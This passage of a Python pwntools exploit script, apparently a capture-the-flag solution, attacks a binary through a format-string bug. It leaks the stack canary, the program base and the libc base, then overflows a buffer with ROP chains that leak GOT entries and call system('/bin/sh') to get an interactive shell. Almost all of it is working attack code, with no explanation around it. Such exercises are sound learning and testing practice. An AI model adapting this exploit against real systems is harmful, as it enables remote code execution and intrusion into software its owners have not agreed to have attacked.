    def stack_checker():
        x, p = init()
        p.sendline(b"tidakboz")
        p.recvline_contains(b"tidakboz")
        fmt = FmtStr(x.sendfmt, 6)
        for i in range(j[0], 100):
            try:
                j[0] = i
                d = fmt.leak_stack(i)
                print(i, hex(d))
            except:
                stack_checker()
    stack_checker()
    # canary 25
    # main 27
    # libc 1


# checker()
x, p = init()

p.sendline(b"tidakboz")
p.recvline_contains(b"tidakboz")
fmt = FmtStr(x.sendfmt, 6)

canary_leak = fmt.leak_stack(25)
exe.address = fmt.leak_stack(27)-4732
libc.address = fmt.leak_stack(1)-0x1eba03
log.info("canary leak: 0x%x", canary_leak)
log.info("main leak: 0x%x", exe.address)
log.info("libc leak: 0x%x", libc.address)

x.debug((
    "source /usr/share/gef/gef.py\n"
    # f"break *{exe.address+4832}\n"
    f"break *{exe.address+4870}\n"
))

def leak_got():
    r = ROP(exe)
    r.raw(r.find_gadget(['ret']))
    r.call('puts', [exe.got['puts']])
    r.call('puts', [exe.got['strncmp']])
    r.call('puts', [exe.got['printf']])
    r.call('puts', [exe.got['fgets']])

    p.sendline(flat(
        b"tidakadaboz\x00",
        cyclic(140),
        canary_leak, 0, r
    ))

    p.recvuntil(b"tidakadaboz")

    puts_leak = u64(p.recvuntil(b"\x7f").strip().ljust(8, b"\x00"))
    log.info("puts leak: 0x%x", puts_leak)

    strncmp_leak = u64(p.recvuntil(b"\x7f")[1:].ljust(8, b"\x00"))
    log.info("strncmp leak: 0x%x", strncmp_leak)

    printf_leak = u64(p.recvuntil(b"\x7f").strip().ljust(8, b"\x00"))
    log.info("printf leak: 0x%x", printf_leak)

    fgets_leak = u64(p.recvuntil(b"\x7f").strip().ljust(8, b"\x00"))
    log.info("fgets leak: 0x%x", fgets_leak)

def RCE():
    r = ROP(libc)
    r.raw(r.find_gadget(['ret']))
    r.call('system', [libc.search(b"/bin/sh").__next__()])  
    p.sendline(flat(
        b"tidakadaboz\x00",
        cyclic(140),
        canary_leak, 0, r
    ))

RCE()
p.interactive()
```




